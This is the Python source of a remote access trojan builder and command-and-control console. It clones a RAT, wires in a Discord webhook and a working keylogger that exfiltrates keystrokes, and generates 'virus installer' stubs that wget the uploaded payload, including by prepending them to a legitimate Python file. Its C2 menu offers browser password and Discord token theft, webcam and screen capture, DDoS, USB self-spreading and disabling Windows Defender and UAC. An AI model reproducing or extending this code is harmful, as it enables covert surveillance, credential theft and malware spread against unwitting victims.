# importing function
import os
import sys
import cv2
import requests
import platform
import subprocess
import shutil
import signal
import socketserver
import argparse
import numpy as np
import threading
import colorama
import time
import socket
import struct
import urllib

from urllib.parse import parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import init, Fore, Style

colorama.init()

# function to display the banner
def display_banner():
    # define the ASCII art
    art = [
        r"                    (\,;,/)",
        r"                     (o o)\//,",
        r"                      \ /     \,",
        r"                     `+'(  (   \    )",
        r"                      //  \   |_./",
        r"                     '~' '~----'",
    ]

    # define a list of colors to use
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

    # print each line of the ASCII art with each character in a different color
    for i in range(len(art)):
        print(*[colors[j % len(colors)] + c for j, c in enumerate(art[i])], sep='')


# function to clear the terminal
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

# function to display the options
def display_options():
    print("""
|==============================|
|1 -start the building process |
|2 -start tcp server           |
|3 -exit                       |
|==============================|
          """)

# rat downloading
def download_rat():
    try:
        print("starting to download rat...")
        # Clone the repository
        subprocess.run(["git", "clone", "https://github.com/annonymous12343/ratfile"])
        # Move v.py to the parent directory
        os.chdir("ratfile")
        os.system("mv v.py ..")
        os.chdir("..")
        # Remove the ratfile directory
        os.system("rm -rf ratfile")
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)


# getting ip and port
def portandip():
    host = input("enter your ip:")
    try:
        port = int(input("enter your port:"))
    except:
        print("please enter a valid port")
        port = int(input("enter your port:"))
    return host, port


# asking for discord webhook for the rat
def awebhook():
    dw =input("enter your discord webhook url:")
    # checking if the WEBHOOK_URL variable is empty
    if dw.strip() == "":
        print("im sorry but the dw variable is empty, please put your discord webhook url in there")
        dw =input("enter your discord webhook url:")
    return dw


def virus_installer():
    clear_terminal()
    display_banner()
    print("""
    |=======================================================|
    |     installer options                                 |
    |=======================================================|
    |1 -generate just a normal installer                    |
    |2 -combine the installer with another legit python file|
    |=======================================================|
          """)

    i =input("enter an option!!:")

    # generating the normal installer
    if i =='1':
        print("Starting to build the virus installer for the target...")
        file_path = input("Please enter the full path of the generated rat: ")
        rat_name =input("please enter the name of the already generated rat!:")
        response = requests.post("https://file.io", files={"file": open(file_path, "rb")})
        data = response.json()
        file_url = data["link"]

        content = '''
    import os
    import sys

    os.system("wget {}")
    '''.format(file_url)

        ct ='''
    subprocess.run("{}")
    '''.format(rat_name)

        content = str(vi) + '\n' + str(content) + '\n' + str(ct)

        file_path = "installer.py"

        with open(file_path, "w") as file:
            file.write(content)
        os.system("rm -rf v.py")


    # generating installer combined with another file
    elif i == '2':
        print("Starting to build the virus installer for the target...")
        file_path = input("Enter your full file path: ")
        rat_name =input("please enter the name of the already generated rat!:")
        response = requests.post("https://file.io", files={"file": open(file_path, "rb")})
        data = response.json()
        file_url = data["link"]

        with open(file_path, 'r') as file:
            existing_code = file.read()

        new_code = '''
    import os
    import sys
    os.system("wget {}")
    '''.format(file_url)

        ct ='''
    subprocess.run("{}")
    '''.format(rat_name)

        content = str(vi) + '\n' + str(new_code) + '\n' + str(ct) + str(existing_code)

        with open(file_path, "w") as file:
            file.write(content)
        os.system("rm -rf v.py")


# operating system
operating_system = platform.system()


###############
# code samples
# keylogger
keylogger = '''
import os
from dhooks import Webhook
from threading import Timer, Thread
from pynput.keyboard import Listener

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()

def keylogger_thread():
    TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.

    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()

keylogger_thread = Thread(target=keylogger_thread)
keylogger_thread.start()
           '''


vi ='''
# installation
import platform
import subprocess

current_os = platform.system()

def install_homebrew():
    if current_os =='Darwin':
        # Check if Homebrew is installed
        try:
            subprocess.check_output(['brew', '--version'])
            print("Homebrew is already installed.")
        except subprocess.CalledProcessError:
            # Homebrew is not installed, so proceed with installation
            print("Homebrew is not installed. Installing now...")
            subprocess.call(['/bin/bash', '-c', "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"])
            print("Homebrew installation completed.")
    else:
        pass

# checking if pkg is installed and if not installs it
def pkg(package_name):
    if current_os == "Darwin": # macOS
        try:
            subprocess.check_output(["brew", "list", package_name])
            print(f"The package '{package_name}' is already installed.")
        except subprocess.CalledProcessError:
            print(f"The package '{package_name}' is not installed. Installing...")
            subprocess.check_call(["brew", "install", package_name])
            print(f"The package '{package_name}' has been installed successfully.")

    elif current_os == "Linux": # Linux
        try:
            subprocess.check_output(["dpkg", "-s", package_name])
            print(f"The package '{package_name}' is already installed.")
        except subprocess.CalledProcessError:
            print(f"The package '{package_name}' is not installed. Installing...")
            subprocess.check_call(["sudo", "apt-get", "install", "-y", package_name])
            print(f"The package '{package_name}' has been installed successfully.")

    elif current_os == "SunOS": # Solaris
        try:
            subprocess.check_output(["pkginfo", package_name])
            print(f"The package '{package_name}' is already installed.")
        except subprocess.CalledProcessError:
            print(f"The package '{package_name}' is not installed. Installing...")
            subprocess.check_call(["pkgadd", "-d", "/path/to/packages", package_name])
            print(f"The package '{package_name}' has been installed successfully.")
    else:
        print("Unsupported operating system cannot install that module")

# calling it to install nedded packages
pkg("x11-xserver-utils")
pkg("dpkg")
pkg("alsa-utils")
install_homebrew()
pkg("espeak")
pkg("xclip")
      '''
#############


# calling functions
clear_terminal()
display_banner()
display_options()


# letting the user pick an option
option =input("pick something?!:")

# starting terminal builder
if option == "1":
    clear_terminal()
    display_banner()
    print("successfully started the interactive builder")
    download_rat()
    host, port = portandip()

    # Read the existing contents of the rat file
    with open("v.py", 'r') as file:
        existing_content = file.read()

    # asking for keylogging and preparing the new content
    keylog = input("do you want a keylogger? (yes or no only):")
    if keylog == 'yes':
        new_content = str(keylogger) + '\n' + str(existing_content)
    else:
        new_content = existing_content

    # writing webhook url and preparing the new content
    wh = awebhook()
    webhook = f'WEBHOOK_URL = "{wh}"\n'
    new_content = webhook + new_content

    # writing ip and port and preparing the new content
    hostw = f'host = "{host}"\n'
    portw = f'port = {port}\n'
    new_content = hostw + portw + new_content

    # Write the modified content to a temporary file
    temp_file = "v.py"
    with open(temp_file, "w") as rat_file:
        rat_file.write(new_content)

    # Replace the original file with the temporary file
    os.replace(temp_file, "v.py")

    # getting a new virus name
    name = input("do you want a special virus name? (yes or no):")
    if name == 'yes':
        fname = input("enter file name!:")
        extension = ".py"
        new_name = str(fname) + str(extension)
        if operating_system == 'Linux':
            os.system("mv v.py " + new_name)
        elif operating_system == 'Windows':
            os.system("ren v.py " + new_name)
    else:
        new_name = None

    # asking to build the virus installer
    ask =input("Do you want to make a virus installer(only yes or no):")
    if ask =='yes':
        virus_installer()


# starting tcp server
elif option =='2':
    # display options
    def display_optionss():
        print(Fore.GREEN + """
              |================================================|
              |                   Options                      |
              |================================================|
              |shell <command> -running a shell command        |
              |shutdown -shuts the device down                 |
              |ats -add to startup rat                         |
              |ccp <code> -runs custom python code             |
              |ps -chromium password stealer(discord webhook)  |
              |sc -screen capture(discord webhook)             |
              |scw -capture image from webcam(discord webhook) |
              |cp -gets clients clipboard(discord webhook)     |
              |geolocate -gets location of computer(discord)   |
              |devinfo -device info(discord webhook)           |
              |steal-discord-tokens -steal them(discord webhook|
              |alert <message> -alerts the user with message   |
              |tts <message> -text to speech                   |
              |lsi -live screen image(only on computers)√      |
              |ddos <url> -starts a ddos attack on that url    |
              |openu -open url                                 |
              |disponn -turns display on                       |
              |dispoff -turns display off                      |
              |ejectcd -ejects default cd tray                 |
              |retractcd -retracts default cd tray             |
              |volumeup -gets volume to 100%                   |
              |volumedown -gets volume to 0%                   |
              |software -gets installed software(discord)      |
              |usbdev -gets all usb devices                    |
              |spread -starts spreading itself via usb devices |
              |================================================|
              |                    Windows                     |
              |================================================|
              |av -checks antiviruses softwares                |
              |inject <process name> -injects python code in it|
              |disable-windows-defender -disables it(admin)    |
              |enable-windows-defender -enables it(admin)      |
              |disable-uac -disables it(admin)                 |
              |disabletaskmgr -disables it(admin)              |
              |extendrights -extends rights(admin)             |
              |isuseradmin -checking if user is admin          |
              |================================================|
        """ + Style.RESET_ALL)

    clients = []
    responses = []

    # checking if ctrl + c is pressed
    def signal_handler(sig, frame):
        print("\nExiting pleaae wait...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)


    def receive_response(client, address):
        while True:
            try:
                response = client.recv(1024).decode('utf-8')
                if response:
                    print(" ")
                    print(colorama.Fore.GREEN + f'Response from {address}: {response}')
                    responses.append(response)
                else:
                    break
            except:
                print(" ")
                print(colorama.Fore.RED + f'Error receiving response from {address}')
                clients.remove(client)
                break

    def main(host, port):
        server = socket.socket()
        server.bind((host, port))
        server.listen(5)

        print(colorama.Fore.YELLOW + f'Listening on {host}:{port}')
        addresses = []

        def input_thread():
            while True:
                time.sleep(1)
                command = input(colorama.Fore.YELLOW + 'Enter a command: ')
                for client in clients:
                    try:
                        client.send(command.encode('utf-8'))
                    except BrokenPipeError:
                        clients.remove(client)

                # checking if command is inject
                if command.startswith("inject "):
                    print("if your file does not have the name payload.py rename it or else the code wont work!")
                    file_path = input("Please enter the full path of the file with the code: ")
                    response = requests.post("https://file.io", files={"file": open(file_path, "rb")})
                    data = response.json()
                    file_url = data["link"]
                    ac =f"shell wget {file_url}"
                    client.send(ac.encode('utf-8'))


        while True:
            client, address = server.accept()
            print(colorama.Fore.CYAN + f'Accepted connection from {address}')
            clients.append(client)
            addresses.append(address)

            # starting command thread
            receive_input_thread = threading.Thread(target=input_thread)
            receive_input_thread.start()

            # starting receive thread
            receive_thread = threading.Thread(target=receive_response, args=(client, address))
            receive_thread.start()

    if __name__ == '__main__':
        clear_terminal()
        display_banner()

        host = '0.0.0.0'
        try:
           port = int(input('Enter a port: '))
        except:
           print(Fore.RED + "Invalid port!!")
           port = int(input('Enter a port: '))

        clear_terminal()
        display_banner()
        display_optionss()
        main(host, port)




# exiting
elif option =='3':
    print(Fore.GREEN + "thanks for uaing the tool!!")
    sys.exit(0)


